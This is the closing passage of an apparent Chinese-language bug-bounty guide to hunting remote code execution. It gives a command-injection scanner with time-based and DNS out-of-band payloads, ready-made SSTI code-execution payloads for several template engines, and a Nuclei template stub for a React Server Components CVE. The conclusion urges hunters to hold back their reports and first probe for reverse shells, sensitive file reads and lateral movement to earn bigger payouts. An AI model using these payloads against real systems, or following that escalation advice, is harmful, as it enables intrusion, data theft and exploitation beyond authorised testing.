            if elapsed > 7:  # sleep 5 + 网络延迟
                print(f"[+] 可能存在时间盲注: {param}={payload}")
        except:
            pass

    def test_dns_out(self, param):
        """DNS外带检测"""
        import random
        import string

        rand = ''.join(random.choices(string.ascii_lowercase, k=8))
        # Linux payload
        payload_linux = f"; nslookup {rand}.{self.collaborator}"
        data = self.params.copy()
        data[param] = payload_linux
        requests.get(self.url, params=data)

        # 检查DNS回调（需配合collaborator服务器）

    def scan_all(self):
        payloads = [
            ";id",
            "| id",
            "&& id",
            "`id`",
            "$(id)",
            ";sleep 5",
            "| sleep 5",
            "& ping -n 6 127.0.0.1 >NUL"
        ]

        for param in self.params.keys():
            for payload in payloads:
                self.test_time_based(param, payload)
```  
### 8.2 SSTI检测Payload库  
```
python
ssti_payloads = {
    "jinja2_basic": "{{7*7}}",
    "jinja2_feature": "{{7*'7'}}",
    "jinja2_rce": "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
    "jinja2_noquote": "{{self.__init__.__globals__.__str__()[1786:1788]}}",  # 生成"id"

    "twig_basic": "{{7*7}}",
    "twig_rce": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",

    "freemarker_basic": "${7*7}",
    "freemarker_rce": "${''.class.forName('java.lang.Runtime').getRuntime().exec('id')}",

    "velocity_basic": "#set($x=7*7)$x",

    "erb_basic": "<%= 7*7 %>",
    "erb_rce": "<%= system('id') %>",

    "ejs_basic": "<%= 7*7 %>",
    "ejs_rce": "<%- global.process.mainModule.require('child_process').execSync('id') %>"
}
```  
### 8.3 Nuclei RCE模板示例  
```
yaml
id: react2shell-detection
info:
  name: React2Shell RCE Detection
  author: hunter
  severity: critical
  description: Detects CVE-2025-55182 React Server Components RCE
requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/x-component
        {{rsc_payload}}

    payloads:
      rsc_payload:
        - "..." # 实际的RSC攻击payload

    matchers:
      - type: word
        words:
          - "command output"
          - "uid="
        part: body
```  
## 第九章 结语：RCE狩猎的终极心法  
  
RCE不是遥不可及的梦想，而是有方法论可循的**系统性狩猎**  
。  
  
从最简单的命令注入，到复杂的反序列化链，再到云原生环境逃逸——**每一个RCE的背后，都是开发者对“输入”的一次信任错付**  
。  
  
我见过太多人面对RCE漏洞时，只满足于弹个计算器就提交。但他们不知道，那个命令注入点可以反弹Shell、可以读内网、可以横向移动。  
  
**下次你发现RCE时，别急着提交。**  
  
先问自己三个问题：  
1. **这个RCE能稳定利用吗？还是竞态条件？**  
  
1. **我能用它读取哪些敏感文件？**  
  
1. **这台机器还能通向哪里？**  
  
答案，往往决定你是拿3000还是拿30000。  
  
**而你的奖金，也在这三个问题的延长线上。**  
  
  
